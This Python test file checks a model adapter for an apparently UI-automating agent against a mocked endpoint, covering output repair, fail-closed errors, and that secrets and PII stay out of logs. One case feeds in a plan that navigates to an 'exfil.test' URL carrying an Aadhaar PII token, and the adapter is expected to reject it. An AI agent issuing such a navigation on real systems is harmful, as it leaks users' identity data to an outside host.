"""OpenAICompatibleAdapter against a fake OpenAI-compatible endpoint (Stage 3A Part G).

Everything here is respx-mocked; no test in this file reaches the network.
"""

from __future__ import annotations

import json
import logging

import httpx
import pytest
import respx

from app.schemas.payload import PayloadV2
from app.vlm.openai_compatible_adapter import (
    FAIL_MODEL_OUTPUT_INVALID,
    FAIL_MODEL_TIMEOUT,
    FAIL_MODEL_UNAVAILABLE,
    FAIL_MODEL_UNGROUNDED,
    OpenAICompatibleAdapter,
    enforce,
)

BASE_URL = "https://model.test/v1"
COMPLETIONS = f"{BASE_URL}/chat/completions"
API_KEY = "sk-super-secret-do-not-log"


def adapter(**kwargs) -> OpenAICompatibleAdapter:
    return OpenAICompatibleAdapter(base_url=BASE_URL, model="test-vlm", api_key=API_KEY, **kwargs)


def completion(content: str, usage: dict | None = None) -> httpx.Response:
    return httpx.Response(
        200,
        json={
            "choices": [{"message": {"content": content}}],
            "usage": usage or {"prompt_tokens": 100, "completion_tokens": 20},
        },
    )


def valid_plan(payload: PayloadV2) -> str:
    el = payload.elements[0]
    return json.dumps(
        {
            "schema": "aegis/2",
            "state_token": payload.state_token,
            "plan": [
                {
                    "action": "click",
                    "target": {"eid": el.eid, "fp": el.fp},
                    "expect": {"eid": el.eid, "visible": True},
                }
            ],
        }
    )


@pytest.fixture
def payload(kyc_payload) -> PayloadV2:
    return PayloadV2.model_validate(kyc_payload)


@respx.mock
@pytest.mark.anyio
async def test_valid_response_passes_through(payload):
    route = respx.post(COMPLETIONS).mock(return_value=completion(valid_plan(payload)))
    result = await adapter().plan(payload)
    assert result.plan[0].action == "click"
    assert route.call_count == 1


@respx.mock
@pytest.mark.anyio
async def test_invalid_then_repaired(payload):
    respx.post(COMPLETIONS).mock(
        side_effect=[completion("not json at all"), completion(valid_plan(payload))]
    )
    subject = adapter()
    result = await subject.plan(payload)
    assert result.plan[0].action == "click"
    assert subject.last_metrics.repairs == 1
    assert subject.last_metrics.json_valid_first_try is False


@respx.mock
@pytest.mark.anyio
async def test_invalid_twice_fails_closed(payload):
    respx.post(COMPLETIONS).mock(side_effect=[completion("not json"), completion("still not json")])
    result = await adapter().plan(payload)
    assert result.plan[0].action == "fail"
    assert result.plan[0].reason == FAIL_MODEL_OUTPUT_INVALID


@respx.mock
@pytest.mark.anyio
async def test_code_fenced_json_is_accepted(payload):
    # Models wrap JSON in fences constantly; that alone should not cost a repair round-trip.
    respx.post(COMPLETIONS).mock(return_value=completion(f"```json\n{valid_plan(payload)}\n```"))
    subject = adapter()
    result = await subject.plan(payload)
    assert result.plan[0].action == "click"
    assert subject.last_metrics.repairs == 0


@respx.mock
@pytest.mark.anyio
async def test_timeout_fails_closed(payload):
    respx.post(COMPLETIONS).mock(side_effect=httpx.ReadTimeout("too slow"))
    result = await adapter().plan(payload)
    assert result.plan[0].reason == FAIL_MODEL_TIMEOUT


@respx.mock
@pytest.mark.anyio
async def test_server_error_fails_closed(payload):
    respx.post(COMPLETIONS).mock(return_value=httpx.Response(503))
    result = await adapter().plan(payload)
    assert result.plan[0].reason == FAIL_MODEL_UNAVAILABLE


@respx.mock
@pytest.mark.anyio
@pytest.mark.parametrize(
    "mutate",
    [
        pytest.param(
            lambda p, plan: {**plan, "state_token": "Szzzzzzzzzz"}, id="wrong state token"
        ),
        pytest.param(
            lambda p, plan: {
                **plan,
                "plan": [{"action": "click", "target": {"eid": "E999999", "fp": "x"}}],
            },
            id="unknown eid",
        ),
        pytest.param(
            lambda p, plan: {
                **plan,
                "plan": [
                    {"action": "click", "target": {"eid": p.elements[0].eid, "fp": "wrong-fp"}}
                ],
            },
            id="fp mismatch",
        ),
        pytest.param(
            lambda p, plan: {
                **plan,
                "plan": [
                    {"action": "navigate", "url": "https://exfil.test/?v=[[PII:AADHAAR:aaaaaaaa]]"}
                ],
            },
            id="token in url",
        ),
    ],
)
async def test_ungrounded_output_is_rejected(payload, mutate):
    plan = json.loads(valid_plan(payload))
    respx.post(COMPLETIONS).mock(return_value=completion(json.dumps(mutate(payload, plan))))
    result = await adapter().plan(payload)
    assert result.plan[0].action == "fail"
    assert result.plan[0].reason == FAIL_MODEL_UNGROUNDED


@respx.mock
@pytest.mark.anyio
async def test_image_is_sent_when_the_payload_has_one(payload):
    route = respx.post(COMPLETIONS).mock(return_value=completion(valid_plan(payload)))
    await adapter().plan(payload)
    content = json.loads(route.calls[0].request.content)["messages"][-1]["content"]
    assert any(part["type"] == "image_url" for part in content)


@respx.mock
@pytest.mark.anyio
async def test_no_image_part_when_the_payload_has_none(kyc_payload):
    # SAME_SCREEN captures ship no image; the request must then be text-only rather than carrying
    # a stale picture of a screen the model has already seen.
    without_image = PayloadV2.model_validate({k: v for k, v in kyc_payload.items() if k != "image"})
    route = respx.post(COMPLETIONS).mock(return_value=completion(valid_plan(without_image)))
    await adapter().plan(without_image)
    content = json.loads(route.calls[0].request.content)["messages"][-1]["content"]
    assert all(part["type"] != "image_url" for part in content)


@respx.mock
@pytest.mark.anyio
async def test_neither_bodies_nor_the_api_key_are_ever_logged(payload, caplog):
    respx.post(COMPLETIONS).mock(return_value=completion(valid_plan(payload)))
    with caplog.at_level(logging.DEBUG, logger="aegis.vlm"):
        await adapter().plan(payload)

    logged = "\n".join(record.getMessage() for record in caplog.records)
    assert API_KEY not in logged
    assert payload.elements[0].label not in logged
    assert "[[PII:" not in logged
    assert "data:image" not in logged
    # What SHOULD be there: shape.
    assert "latency" in logged


@respx.mock
@pytest.mark.anyio
async def test_metrics_record_shape_not_content(payload):
    respx.post(COMPLETIONS).mock(
        return_value=completion(
            valid_plan(payload), usage={"prompt_tokens": 512, "completion_tokens": 64}
        )
    )
    subject = adapter()
    await subject.plan(payload)
    assert subject.last_metrics.prompt_tokens == 512
    assert subject.last_metrics.completion_tokens == 64
    assert subject.last_metrics.model_latency_ms >= 0
    assert subject.last_metrics.outcome == "ok"


def test_enforce_accepts_a_grounded_plan(payload):
    from app.schemas.plan import PlanV2

    assert enforce(PlanV2.model_validate(json.loads(valid_plan(payload))), payload) is None


def test_enforce_rejects_a_context_request_naming_an_element(payload):
    from app.schemas.plan import PlanV2

    plan = PlanV2.model_validate(
        {
            "schema": "aegis/2",
            "state_token": payload.state_token,
            "request_context": {
                "reason": f"reveal {payload.elements[0].eid} please",
                "kind": "more_elements",
            },
        }
    )
    assert enforce(plan, payload) == "CONTEXT_REQUEST_NAMES_ELEMENT"


def test_enforce_allows_tokens_inside_an_answer(payload):
    from app.schemas.plan import PlanV2

    plan = PlanV2.model_validate(
        {
            "schema": "aegis/2",
            "state_token": payload.state_token,
            "answer": {"text": "Your balance is [[PII:FINANCIAL_VALUE:aaaaaaaa]]"},
        }
    )
    assert enforce(plan, payload) is None
